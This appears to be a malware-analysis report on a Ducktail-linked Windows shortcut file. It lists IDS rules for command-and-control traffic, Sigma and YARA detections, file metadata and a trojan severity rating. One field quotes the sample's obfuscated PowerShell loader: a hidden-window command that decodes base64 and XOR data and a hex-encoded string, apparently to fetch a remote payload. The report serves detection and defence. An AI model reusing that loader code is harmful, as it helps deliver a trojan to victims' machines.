crowdsourced_ids_results.rule_category: Malware Command and Control Activity Detected
crowdsourced_ids_results.rule_msg: ET MALWARE Ducktail CnC Activity - Begin Download Command (POST)
crowdsourced_ids_results.rule_raw: alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"ET MALWARE Ducktail CnC Activity - Begin Download Command (POST)"; flow:established,to_server; http.method; content:"POST"; http.uri; pcre:"/^\x2f[a-z0-9]{96}$/"; urilen:97; http.user_agent; content:"WindowsPowerShell/"; http.content_type; bsize:16; content:"application/json"; http.request_body; content:"|5b|"; startswith; content:"|22 5c 22|begin|20|download|20|http"; fast_pattern; content:"|22 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 22 0d 0a 5d|"; endswith; reference:md5,19df486249801c08f0efde6a16e135ee; reference:url,x.com/suyog41/status/1875174914128310378; classtype:command-and-control; sid:2058892; rev:1; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, attack_target Client_Endpoint, tls_state plaintext, created_at 2025_01_03, deployment Perimeter, confidence High, signature_severity Major, tag c2, tag Ducktail, updated_at 2025_01_03, mitre_tactic_id TA0011, mitre_tactic_name Command_And_Control, mitre_technique_id T1071, mitre_technique_name Application_Layer_Protocol;)

crowdsourced_ids_results.rule_category: Malware Command and Control Activity Detected
crowdsourced_ids_results.rule_raw: alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"ET MALWARE Ducktail CnC Checkin (GET)"; flow:established,to_server; http.method; content:"GET"; http.uri; pcre:"/^\x2f\w\x2f[a-z0-9]{96}$/"; urilen:99; http.user_agent; content:"WindowsPowerShell/"; fast_pattern; http.header_names; bsize:22; content:"|0d 0a|User-Agent|0d 0a|Host|0d 0a 0d 0a|"; reference:url,x.com/suyog41/status/1875174914128310378; reference:md5,19df486249801c08f0efde6a16e135ee; classtype:command-and-control; sid:2058957; rev:1; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, attack_target Client_Endpoint, tls_state plaintext, created_at 2025_01_03, deployment Perimeter, confidence High, signature_severity Major, tag c2, tag Ducktail, updated_at 2025_01_03, mitre_tactic_id TA0011, mitre_tactic_name Command_And_Control, mitre_technique_id T1071, mitre_technique_name Application_Layer_Protocol; target:src_ip;)

crowdsourced_ids_results.rule_msg: ET INFO Windows Powershell User-Agent Usage
crowdsourced_ids_results.rule_raw: alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"ET INFO Windows Powershell User-Agent Usage"; flow:established,to_server; http.user_agent; content:"Mozilla/"; startswith; content:") WindowsPowerShell/"; distance:0; fast_pattern; classtype:not-suspicious; sid:2033355; rev:1; metadata:attack_target Client_Endpoint, created_at 2021_07_16, deployment Perimeter, confidence High, signature_severity Informational, tag Description_Generated_By_Proofpoint_Nexus, updated_at 2021_07_16;)

exiftool.Flags: WorkingDir, CommandArgs, IconFile, Unicode, ExpString, ExpIcon

sigma_analysis_results.rule_description: Detects suspicious powershell process starts with base64 encoded commands (e.g. Emotet)
sigma_analysis_results.rule_author: Florian Roth (Nextron Systems), Markus Neis, Jonhnathan Ribeiro, Daniil Yugoslavskiy, Anton Kutepov, oscd.community

sigma_analysis_results.rule_description: Detects usage of a base64 encoded "FromBase64String" cmdlet in a process command line
Detects usage of the "FromBase64String" function in the commandline which is used to decode a base64 encoded string
Detects presence of a potentially xor encoded powershell command
sigma_analysis_results.rule_author: Sami Ruohonen, Harish Segar, Tim Shelton, Teymur Kheirkhabarov, Vasiliy Burov, oscd.community, Nasreddine Bencherchali

sigma_analysis_results.rule_description:
Adversaries may use hidden windows to conceal malicious activity from the plain sight of users.
In some cases, windows that would typically be displayed when an application carries out an operation can be hidden

match_context.values: @{ScriptBlockText=Start-Process -FilePath "powershell.exe" -WindowStyle Hidden  -ArgumentList '-NoProfile -w hidden -Command "$DATa = ([TexT.EncoDing]::UTF8.GETString((&((-join([Convert]::FromBase64String(''4arn4avn4ajn'')|%{[char]($_ -bxor 154)})) -f [char]((0x49)),[char]((0x57)),[char]((0x52))) (-join ([regex]::Matches(\"170B0B0F0C45505015101D1B1A0C1C0D160F0B1610111D1010171010511C1012500B504D1B4F491B1D1A4E4D4D4F494B4A4B1B4D4A4F471A4C4B1C484B4E471B4E4E494D4D4F1B1C471B471C1C4B474E464847484848471B1A4D48484B1D1A1C1 [TRUNCATED]; MessageTotal=1; ScriptBlockId=36202e52-0174-442f-8ceb-7abefdcbab28; Path=; EventID=4104; MessageNumber=1}

sigma_analysis_results.rule_title: Suspicious Execution of Powershell with Base64
sigma_analysis_results.rule_description: Commandline to launch powershell with a base64 payload

sigma_analysis_results.rule_title: Potential Encoded PowerShell Patterns In CommandLine
sigma_analysis_results.rule_description: Detects specific combinations of encoding methods in PowerShell via the commandline
sigma_analysis_results.rule_author: Teymur Kheirkhabarov (idea), Vasiliy Burov (rule), oscd.community, Tim Shelton

sigma_analysis_results.rule_description: Detects non-interactive PowerShell activity by looking at the "powershell" process with a non-user GUI process such as "explorer.exe" as a parent.

threat_severity.level_description: Severity HIGH because it was considered trojan. Other contributing factor was that it could not be run in sandboxes.

crowdsourced_yara_results.description: Identifies PowerShell artefacts in shortcut (LNK) files.
crowdsourced_yara_results.author: @bartblaze

crowdsourced_yara_results.description: Identifies shortcut (LNK) file larger than 100KB. Most goodware LNK files are smaller than 100KB.
crowdsourced_yara_results.author: @bartblaze

crowdsourced_yara_results.description: Detects a suspiciously big LNK file - maybe with embedded content
crowdsourced_yara_results.author: Florian Roth (Nextron Systems)

attributes.magic: MS Windows shortcut, Has Working directory, Has command line arguments, Icon number=360, ctime=Thu Dec 31 23:59:59 1969, mtime=Thu Dec 31 23:59:59 1969, atime=Thu Dec 31 23:59:59 1969, length=0, window=hide
